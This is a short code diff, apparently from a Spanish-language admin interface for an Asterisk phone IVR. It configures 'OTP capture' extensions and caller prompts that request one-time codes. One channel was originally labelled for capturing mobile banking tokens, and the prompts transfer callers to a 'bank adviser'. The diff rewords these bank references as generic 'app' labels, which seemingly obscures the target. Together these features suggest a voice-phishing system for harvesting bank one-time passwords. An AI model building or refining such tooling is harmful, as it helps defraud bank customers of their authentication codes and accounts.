@@ -105,9 +105,9 @@ export const OTP_EXTENSIONS_CONFIG: OtpExtensionInfo[] = [
     id: '6666',
     extension: '6666',
     shortExt: '666',
-    name: 'Captura Secundaria / Token Banco Móvil',
-    purpose: 'Canal optimizado para Token Móvil de aplicaciones bancarias y autenticación de app.',
-    badge: 'Banca / Token (6666 / 666)',
+    name: 'Captura Secundaria / Token App Móvil',
+    purpose: 'Canal optimizado para Token Móvil de aplicaciones y autenticación de usuario.',
+    badge: 'App / Token (6666 / 666)',
     colorName: 'cyan',
     bgGradient: 'from-cyan-950/40 via-slate-900 to-slate-950',
     borderColor: 'border-cyan-500/40',
@@ -310,7 +310,7 @@ const SYSTEM_ROLES: RoleConfig[] = [
     icon: PhoneForwarded,
     description: 'Audio de transición que escucha el cliente al presionar la tecla 1 ("Un momento, le estamos comunicando con un asesor...").',
     astDbKey: 'ivr_vars default_agent',
-    fallbackDefault: 'custom/conectar_asesor_banco',
+    fallbackDefault: 'custom/conectar_asesor',
   },
   {
     role: 'press1_invalid',
@@ -453,7 +453,7 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
   const [activeAssignments, setActiveAssignments] = useState<ActiveAudioAssignments>(
     propActiveAssignments || {
       press1_welcome: 'custom/bienvenida_corporativa',
-      agent_transfer: 'custom/conectar_asesor_banco',
+      agent_transfer: 'custom/conectar_asesor',
       press1_invalid: 'custom/opcion_invalida',
       welcome_7777: 'custom/solicitar_codigo_otp',
       wait_7777: 'custom/un_momento_validando_informacion',
